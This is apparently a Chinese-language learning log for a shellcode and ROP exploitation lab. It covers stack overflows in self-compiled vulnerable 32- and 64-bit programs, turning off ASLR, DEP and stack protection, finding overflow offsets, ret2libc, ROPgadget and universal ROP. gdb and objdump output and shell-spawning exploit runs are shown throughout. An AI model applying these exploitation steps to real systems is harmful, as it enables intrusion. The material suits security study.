# shellcode_learning
这个日志记录了学习shellcode过程和在学习过程中遇到的问题。<br><br>
主要参考了蒸米的一步一步学ROP，修改了作者的部分错误和参考了一些其他博客。<br><br>

## 配置环境
操作系统：ubuntu16.04 LTS 64位系统（建议不使用ubuntu18,可能使用了更加复杂的地址保护机制，容易导致实验失败）<br>
编译工具：
1. python2 <br>
2. pwntools(py的库函数，安装方法见https://www.cnblogs.com/pcat/p/5451780.html ）<br>
3. objdump <br>
4. ROPgadget<br>
5. socat挂载程序<br><br>
## ROP攻击
ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。<br><br>
## linux_86
### Control Flow Hijack 程序流劫持
比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。<br>
首先我们先关闭这些保护措施来实施一次攻击（c语言代码在linux_86,level1中）其中-fno-stack-protector关掉Stack Protector，-z execstack关掉DEP<br>
$ gcc -fno-stack-protector -z execstack  -m32 -o level1 level1.c<br>
注意：因为ubuntu16.04是64位系统在编译 -m32 时会报错，因为需要安装安装库文件sudo apt-get install gcc-4.8-multilib g++-4.8-multilib<br><br><br>
执行以下指令ASLR保护<br>
$ sudo -s<br>
$ echo 0 > /proc/sys/kernel/randomize_va_space<br>
$ exit<br><br>
我们利用pattern.py脚本来寻找溢出点<br>
$ python pattern.py create 150得到<br>
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9<br><br><br>
使用gdb调试level1<br>
$ gdb ./level1<br>
（gdb)run 得到<br>
Program received signal SIGSEGV, Segmentation fault.<br>
0x37654136 in ?? ()<br>
（gdb）quit<br>
我们可以得知内存出错的地址为0x37654136，通过pattern.py脚本可以知道溢出点位置<br>
$ python pattern.py offset 0x37654136 得到<br>
hex pattern decoded as: 6Ae7<br>
140<br><br><br>
PC覆盖的溢出点为140字节处，我们只需要构造一个“A”*140+ret(返回地址）的字符串就可以让PC执行ret上的代码了，这里使用execve ("/bin/sh")命令的语句作为shellcode，这个可以打开一个终端（见linux_86 exp1.py)。原理如下所示：<br>
[shellcode][“AAAAAAAAAAAAAA”….][ret]<br>
^------------------------------------<br>
但在现实攻击中shellcode地址的位置并非这么简单。因为在gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。因此不能通过使用gdb调试目标程序，然后查看内存来确定shellcode的位置。<br><br>
为了解决这个问题可以开启core dump，当程序内存出现错误的时候系统会生成一个core dump文件在tmp目录下，用gdb调试core文件就可以获取到真实的地址。<br>
$ ulimit -c unlimited<br>
$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'<br><br><br>
$ ./level1 得到<br>
ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
段错误 (核心已转储)<br>
（可以先进入cd /tmp，然后ls查看core文件名称）<br>
$ gdb level1 /tmp/core.1545029320<br>
Program terminated with signal SIGSEGV, Segmentation fault.<br>
#0  0x41414141 in ?? ()<br>
通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffffd000<br>
(gdb) x/10s $esp -144<br>
0xffffd000:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"<br>
0xffffd099:	""<br><br><br>
执行python脚本完成攻击：<br>
$ python exp1.py<br>
[+] Starting local process './level1': pid 14146<br>
[*] Switching to interactive mode<br>
$ whoami<br>
[用户名] （得到你的用户名则是攻击成功了，如果攻击失败，应该是ret地址出错）<br><br>


### 如何进行远程调试
关闭地址随机化<br>
$ sudo -s<br>
$ echo 0 > /proc/sys/kernel/randomize_va_space<br>
$ exit<br>
得到core文件方便gdb调试<br>
$ ulimit -c unlimited<br>
$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'<br>
进行socat挂载程序：<br>
socat TCP4-LISTEN:2008,fork EXEC:./level1<br>
开启另一终端：<br>
ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
$ gdb level1 /tmp/core.1545029325<br>
Program terminated with signal SIGSEGV, Segmentation fault.<br>
#0  0x41414141 in ?? ()<br>
(gdb) x/10s $esp -144<br>
0xffffcf50:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"<br>
将python程序设置到remote模式后：<br>
$ python exp1.py<br>
[+] Opening connection to 127.0.0.1 on port 2008: Done<br>
[*] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>

### Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护
$  gcc -fno-stack-protector -m32 -o level2 level1.c<br>
$ gdb ./level2<br>
(gdb) break main<br>
Breakpoint 1 at 0x80484ea<br>
(gdb) run<br>
Breakpoint 1, 0x080484ea in main ()<br>
(gdb) print system 得到<br>
$1 = {<text variable, no debug info>} 0xf7e3f940 <system><br>
(gdb) print __libc_start_main<br>
$2 = {<text variable, no debug info>} 0xf7e1d540 <__libc_start_main><br>
(gdb) find 0xf7e1d540, +2200000, "/bin/sh"<br>
0xf7f5e02b<br>
(gdb）quit<br>
$ python exp2.py<br>
[+] Starting local process './level2': pid 14319<br>
[*] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>
  
### ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护
$ sudo -s<br>
$ echo 2 > /proc/sys/kernel/randomize_va_space<br>
$ cat /proc/sys/kernel/randomize_va_space<br>
2<br>
$ exit<br>
$ objdump -d -j .plt level2 得到<br>
level2：     文件格式 elf32-i386<br>
Disassembly of section .plt:<br>
080482f0 <read@plt-0x10>:<br>
 80482f0:	ff 35 04 a0 04 08    	pushl  0x804a004<br>
 80482f6:	ff 25 08 a0 04 08    	jmp    *0x804a008<br>
 80482fc:	00 00                	add    %al,(%eax)<br>
	...<br>

08048300 <read@plt>:<br>
 8048300:	ff 25 0c a0 04 08    	jmp    *0x804a00c<br>
 8048306:	68 00 00 00 00       	push   $0x0<br>
 804830b:	e9 e0 ff ff ff       	jmp    80482f0 <_init+0x28><br>

08048310 <__libc_start_main@plt>:<br>
 8048310:	ff 25 10 a0 04 08    	jmp    *0x804a010<br>
 8048316:	68 08 00 00 00       	push   $0x8<br>
 804831b:	e9 d0 ff ff ff       	jmp    80482f0 <_init+0x28><br>

08048320 <write@plt>:<br>
 8048320:	ff 25 14 a0 04 08    	jmp    *0x804a014<br>
 8048326:	68 10 00 00 00       	push   $0x10<br>
 804832b:	e9 c0 ff ff ff       	jmp    80482f0 <_init+0x28><br>
$ objdump -R level2 得到<br>
level2：     文件格式 elf32-i386<br>

DYNAMIC RELOCATION RECORDS<br>
OFFSET   TYPE              VALUE <br>
08049ffc R_386_GLOB_DAT    __gmon_start__<br>
0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0<br>
0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>
0804a014 R_386_JUMP_SLOT   write@GLIBC_2.0<br>

$ ldd level2<br>
$ cp /lib32/libc.so.6 libc.so<br>
$ objdump -d level2 | grep vulnerable_function0804843b <vulnerable_function>:<br>
 8048471:	e8 c5 ff ff ff       	call   804843b <vulnerable_function><br>
$ python exp3.py<br>
[ * ].......<br>
[ * ] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>

## linux_64
### linux_64溢出攻击（利用辅助函数）
$ gcc -fno-stack-protector level3.c -o level3<br>
$ python pattern.py create 150 > payload<br>
$ gdb ./level3<br>
(gdb) run < payload<br>
Starting program: /home/dzh/learning/level3 < payload<br>
Hello, World<br>

Program received signal SIGSEGV, Segmentation fault.<br>
0x00000000004005e7 in vulnerable_function ()<br>
(gdb) x/gx $rsp<br>
0x7fffffffde68:	0x3765413665413565<br>
(gdb) quit<br>
$ python pattern.py offset 0x3765413665413565<br>
hex pattern decoded as: e5Ae6Ae7<br>
136<br>
python -c 'print "A"*136+"ABCDEF\x00\x00"'>payload<br>
$ gdb ./level3<br>
(gdb) run < payload<br>
Starting program: /home/dzh/learning/level3 < payload<br>
Hello, World<br>

Program received signal SIGSEGV, Segmentation fault.<br>
0x0000464544434241 in ?? ()<br>
(gdb) quit<br>
$ objdump -d level3 | grep callsystem<br>
00000000004005b6 <callsystem>:<br>
python exp5.py<br>
[ * ].......<br>
[ * ] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>

### 使用工具寻找gadgets
这里只使用了ROPgadget，初次之外还有一些知名的工具：
1. ROPEME: https://github.com/packz/ropeme
2. Ropper: https://github.com/sashs/Ropper
3. ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
4. rp++: https://github.com/0vercl0k/rp
<br>
gcc -fno-stack-protector level4.c -o level4 -ldl<br>
$ ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi<br>
0x0000000000020256 : pop rdi ; pop rbp ; ret<br>
0x0000000000021102 : pop rdi ; ret<br>
$ python exp6.py<br>
[*] '/home/dzh/learning/libc.so.6'<br>
$ whoami
[用户名] <br><br>

### 通用ROP攻击
$ objdump -d ./level5
$ python exp7.py<br>
[*] '/home/dzh/learning/level5'<br>
[+] Starting local process './level5': pid 4031<br>
got_write: 0x601018<br>
got_read: 0x601020<br>
off_system_addr: 0xb1f20<br>
#############sending payload1#############<br>
write_addr: 0x7ffff7b042b0<br>
system_addr: 0x7ffff7a52390<br>
Hello, World<br>
#############sending payload2#############<br>
Hello, World<br>
#############sending payload3#############<br>
[*] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>









